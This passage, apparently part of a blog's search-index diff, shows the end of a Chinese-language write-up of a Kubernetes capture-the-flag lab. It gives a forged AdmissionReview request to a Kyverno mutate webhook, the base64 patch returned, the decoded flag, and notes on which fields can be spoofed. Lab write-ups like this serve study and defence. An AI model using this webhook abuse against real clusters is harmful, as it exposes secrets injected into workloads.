quot;kind&quot;:&quot;CreateOptions&quot;&#125;,&quot;dryRun&quot;:true&#125;&#125;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;kind&quot;:&quot;AdmissionReview&quot;,&quot;apiVersion&quot;:&quot;admission.k8s.io/v1&quot;,&quot;request&quot;:&#123;&quot;uid&quot;:&quot;705ab4f5-6393-11e8-b7cc-42010a800002&quot;,&quot;kind&quot;:&#123;&quot;group&quot;:&quot;&quot;,&quot;version&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;Pod&quot;&#125;,&quot;resource&quot;:&#123;&quot;group&quot;:&quot;&quot;,&quot;version&quot;:&quot;v1&quot;,&quot;resource&quot;:&quot;pods&quot;&#125;,&quot;requestKind&quot;:&#123;&quot;group&quot;:&quot;&quot;,&quot;version&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;Pod&quot;&#125;,&quot;requestResource&quot;:&#123;&quot;group&quot;:&quot;&quot;,&quot;version&quot;:&quot;v1&quot;,&quot;resource&quot;:&quot;pods&quot;&#125;,&quot;name&quot;:&quot;example-pod&quot;,&quot;namespace&quot;:&quot;sensitive-ns&quot;,&quot;operation&quot;:&quot;CREATE&quot;,&quot;userInfo&quot;:&#123;&quot;username&quot;:&quot;admin&quot;,&quot;uid&quot;:&quot;014fbff9a07c&quot;,&quot;groups&quot;:[&quot;system:authenticated&quot;]&#125;,&quot;object&quot;:&#123;&quot;apiVersion&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;Pod&quot;,&quot;metadata&quot;:&#123;&quot;name&quot;:&quot;example-pod&quot;,&quot;namespace&quot;:&quot;sensitive-ns&quot;&#125;,&quot;spec&quot;:&#123;&quot;containers&quot;:[&#123;&quot;name&quot;:&quot;example-container&quot;,&quot;image&quot;:&quot;nginx&quot;,&quot;env&quot;:[&#123;&quot;name&quot;:&quot;FLAG&quot;,&quot;value&quot;:&quot;&#123;flag&#125;&quot;&#125;]&#125;]&#125;&#125;,&quot;oldObject&quot;:null,&quot;dryRun&quot;:true,&quot;options&quot;:&#123;&quot;apiVersion&quot;:&quot;meta.k8s.io/v1&quot;,&quot;kind&quot;:&quot;CreateOptions&quot;&#125;&#125;,&quot;response&quot;:&#123;&quot;uid&quot;:&quot;705ab4f5-6393-11e8-b7cc-42010a800002&quot;,&quot;allowed&quot;:true,&quot;patch&quot;:&quot;W3sib3AiOiJyZXBsYWNlIiwicGF0aCI6Ii9zcGVjL2NvbnRhaW5lcnMvMC9lbnYvMC92YWx1ZSIsInZhbHVlIjoid2l6X2s4c19sYW5fcGFydHl7eW91LWFyZS1rOHMtbmV0LW1hc3Rlci13aXRoLWdyZWF0LXBvd2VyLXRvLW11dGF0ZS15b3VyLXdheS10by12aWN0b3J5fSJ9LCB7InBhdGgiOiIvbWV0YWRhdGEvYW5ub3RhdGlvbnMiLCJvcCI6ImFkZCIsInZhbHVlIjp7InBvbGljaWVzLmt5dmVybm8uaW8vbGFzdC1hcHBsaWVkLXBhdGNoZXMiOiJpbmplY3QtZW52LXZhcnMuYXBwbHktZmxhZy10by1lbnYua3l2ZXJuby5pbzogcmVwbGFjZWQgL3NwZWMvY29udGFpbmVycy8wL2Vudi8wL3ZhbHVlXG4ifX1d&quot;,&quot;patchType&quot;:&quot;JSONPatch&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">W3sib3AiOiJyZXBsYWNlIiwicGF0aCI6Ii9zcGVjL2NvbnRhaW5lcnMvMC9lbnYvMC92YWx1ZSIsInZhbHVlIjoid2l6X2s4c19sYW5fcGFydHl7eW91LWFyZS1rOHMtbmV0LW1hc3Rlci13aXRoLWdyZWF0LXBvd2VyLXRvLW11dGF0ZS15b3VyLXdheS10by12aWN0b3J5fSJ9LCB7InBhdGgiOiIvbWV0YWRhdGEvYW5ub3RhdGlvbnMiLCJvcCI6ImFkZCIsInZhbHVlIjp7InBvbGljaWVzLmt5dmVybm8uaW8vbGFzdC1hcHBsaWVkLXBhdGNoZXMiOiJpbmplY3QtZW52LXZhcnMuYXBwbHktZmxhZy10by1lbnYua3l2ZXJuby5pbzogcmVwbGFjZWQgL3NwZWMvY29udGFpbmVycy8wL2Vudi8wL3ZhbHVlXG4ifX1d</span><br><span class="line">#base64解码</span><br><span class="line">[&#123;&quot;op&quot;:&quot;replace&quot;,&quot;path&quot;:&quot;/spec/containers/0/env/0/value&quot;,&quot;value&quot;:&quot;wiz_k8s_lan_party&#123;you-are-k8s-net-master-with-great-power-to-mutate-your-way-to-victory&#125;&quot;&#125;, &#123;&quot;path&quot;:&quot;/metadata/annotations&quot;,&quot;op&quot;:&quot;add&quot;,&quot;value&quot;:&#123;&quot;policies.kyverno.io/last-applied-patches&quot;:&quot;inject-env-vars.apply-flag-to-env.kyverno.io: replaced /spec/containers/0/env/0/value\n&quot;&#125;&#125;]</span><br></pre></td></tr></table></figure>
+
+<h3 id="后语-3"><a href="#后语-3" class="headerlink" title="后语"></a>后语</h3><h4 id="flag问题"><a href="#flag问题" class="headerlink" title="flag问题"></a>flag问题</h4><p>这个漏洞的核心是 Kyverno 的策略定义了 <strong>自动注入环境变量 <code>FLAG</code></strong> 的规则。每当一个新的 Pod 被创建时，Kyverno 会自动根据策略修改 Pod 的配置，并注入指定的环境变量。</p>
+<h4 id="漏洞问题"><a href="#漏洞问题" class="headerlink" title="漏洞问题"></a>漏洞问题</h4><p>这里核心问题就是 <strong>不安全配置</strong> 和 <strong>Admission Webhook 的滥用</strong> 导致的漏洞，而不是 Kubernetes 系统本身的问题。</p>
+<h4 id="url问题"><a href="#url问题" class="headerlink" title="url问题"></a>url问题</h4><p>**这个一定是 <code>https://kyverno-svc.kyverno.svc.cluster.local/mutate</code> **这个路径，因为是基于 <strong>Kyverno 的 Mutating Admission Webhook</strong>，所以必须要发送请求到它的 <code>/mutate</code> 路径。原因如下：</p>
+<ol>
+<li><strong>为什么是 <code>/mutate</code> 路径？</strong><ul>
+<li><code>kyverno-svc</code> 是 Kyverno 的核心服务，用于处理 Admission Webhook 请求。</li>
+<li>路径 <code>/mutate</code> 是专门用来处理资源（如 Pod）创建或修改请求的入口。它会按照定义的策略修改请求的对象（例如自动注入环境变量）。</li>
+</ul>
+</li>
+<li><strong>其他路径的作用</strong><ul>
+<li><code>/policymutate</code> 是用来修改策略的，通常和策略本身有关，而不是用于修改资源（如 Pod）。</li>
+<li><code>/metrics</code> 等路径主要是暴露监控信息，和实际的 Admission Webhook 请求无关。</li>
+</ul>
+</li>
+</ol>
+<p>所以，这个思路必须发送到 <code>/mutate</code>，这是漏洞利用的核心。</p>
+<h4 id="data-数据"><a href="#data-数据" class="headerlink" title="data 数据"></a><strong><code>data</code> 数据</strong></h4><p><code>data</code> 数据 <strong>不能完全随便写</strong>，需要符合一定的格式要求，特别是 Kubernetes Admission Webhook 的 <strong>AdmissionReview</strong> 格式。具体细节如下：</p>
+<p><strong>哪些字段是必须的？</strong></p>
+<ol>
+<li><strong>基本结构</strong> AdmissionReview 是一个标准的 Kubernetes API 结构，必须包含以下字段：<ul>
+<li><code>apiVersion</code>: 必须是 <code>&quot;admission.k8s.io/v1&quot;</code>。</li>
+<li><code>kind</code>: 必须是 <code>&quot;AdmissionReview&quot;</code>。</li>
+<li><code>request</code>: 请求内容，具体描述你要操作的资源。</li>
+</ul>
+</li>
+<li><strong>关键字段</strong><ul>
+<li>**<code>uid</code>**：这个字段是随机生成的唯一 ID，用于追踪请求。你可以随意设置一个 UUID，但不能省略。</li>
+<li>**<code>kind</code> 和 <code>resource</code>**：必须明确你操作的资源类型。例如，<code>kind: Pod</code> 表示你在操作 Pod。</li>
+<li>**<code>operation</code>**：操作类型，通常是 <code>CREATE</code>，表示创建一个新资源。</li>
+<li>**<code>namespace</code>**：必须指定目标命名空间，例如 <code>sensitive-ns</code>。</li>
+<li>**<code>object</code>**：具体描述要创建的资源（如 Pod），这部分内容需要包含资源的详细配置。</li>
+</ul>
+</li>
+<li><strong>哪些字段可以修改？</strong><ul>
+<li><code>userInfo</code> 中的字段（如 <code>username</code>, <code>uid</code>）可以随意修改，因为 Kyverno 通常不会严格验证这些字段。但为了模拟合法用户，建议保留类似的格式。</li>
+</ul>
+</li>
+<li><strong>哪些字段不能省略？</strong><ul>
+<li>必须包含 <code>object</code>，描述具体的资源对象（如 Pod）。</li>
+<li>必须包含 <code>dryRun: true</code>，否则请求可能会被实际执行，导致不可预测的结果。</li>
+</ul>
+</li>
+</ol>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://tari.moe/2024/k8slanparty.html#9367d23efb7e4568bcbd0e1fd86da080">https://tari.moe/2024/k8slanparty.html#9367d23efb7e4568bcbd0e1fd86da080</a></p>
+]]></content>
+      <categories>
+        <category>云安全</category>
+      </categories>
+      <tags>
+        <tag>云安全</tag>
+        <tag>靶场</tag>
+      </tags>
+  </entry>
 </search>
